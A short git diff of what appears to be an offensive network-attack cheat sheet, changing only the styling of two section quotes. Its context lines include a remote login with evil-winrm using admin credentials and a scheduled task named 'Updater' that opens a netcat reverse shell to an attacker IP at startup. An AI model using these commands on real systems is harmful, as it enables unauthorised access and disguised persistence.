@@ -105,7 +105,7 @@ evil-winrm -i <IP> -u admin -p password
 
 ## 5. Lateral Movement
 
-> *"Once you're in — the goal is **domain admin**. Pivoting begins."*
+> *`"Once you're in — the goal is **domain admin**. Pivoting begins."`*{: .filepath}
 
 ### Use Compromised Creds
 ```bash
@@ -189,7 +189,7 @@ schtasks /create /tn "Updater" /tr "nc.exe -e cmd.exe <IP> 4444" /sc onstart
 
 ## Final Advice
 
-> **“A network isn’t a structure. It’s a trust graph. Hack the trust.”**
+> **`“A network isn’t a structure. It’s a trust graph. Hack the trust.”`**{: .filepath}
 
 - Exploit trust, not just services
 - Map before attacking
